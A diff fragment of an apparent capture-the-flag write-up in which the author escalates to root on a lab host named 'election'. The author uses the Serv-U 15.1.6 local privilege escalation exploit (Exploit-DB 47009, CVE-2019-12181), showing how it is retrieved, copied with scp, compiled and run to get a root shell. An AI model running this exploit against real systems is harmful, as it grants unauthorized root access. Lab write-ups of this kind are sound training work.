@@ -516,17 +516,13 @@ Serv-U Web Client 9.0.0.5 - Remote Buffer Overflow (2)                          
 Shellcodes: No Results
 ```
 Just a few results there. And with out version (from the log) of 15.1.6.25 we spot 2 local priv esc vulns that might be worth checking (specially with the SUID bit set which means the app runs as the owner and not as the user who started it). [Exploit DB - Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1)](https://www.exploit-db.com/exploits/47009)
+```
+searchsploit -m 47009
+```
+This copies the exploit code to a local file. Lets take a look at it.
+```
+cat 47009.c
 
-Seems like a fairly simple priv esc. Lets give it a shot.
-
-Lets create a file in `/tmp` called `exploit.c`.
-```
-love@election:/usr/local/Serv-U$ cd /tmp
-love@election:/tmp$ touch exploit.c
-love@election:/tmp$ vi exploit.c
-```
-And paste in the exploit code.
-```
 /*
 
 CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation
@@ -551,18 +547,24 @@ int main()
     printf("ret val: %d errno: %d\n", ret_val, errno);
     return errno;
 }
-````
-:wq to save and quit that file.
-
-Now compile and run it.
 ```
-love@election:/tmp$ gcc exploit.c -o pe
+Seems like a fairly simple priv esc.
+
+Lets copy that onto the target server.
+```
+scp 47009.c love@$TARGETIP:/tmp/
+```
+
+Now jump back into our love ssh. Lets compile and run that exploit.
+
+```
+love@election:/tmp$ gcc 47009.c -o pe
 love@election:/tmp$ ./pe
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
 opening root shell
 #
 ```
-It looks like a simple shell. Lets see who we are.
+It looks like we have a simple shell. Lets see if we inherited root.
 ```
 # whoami
 root
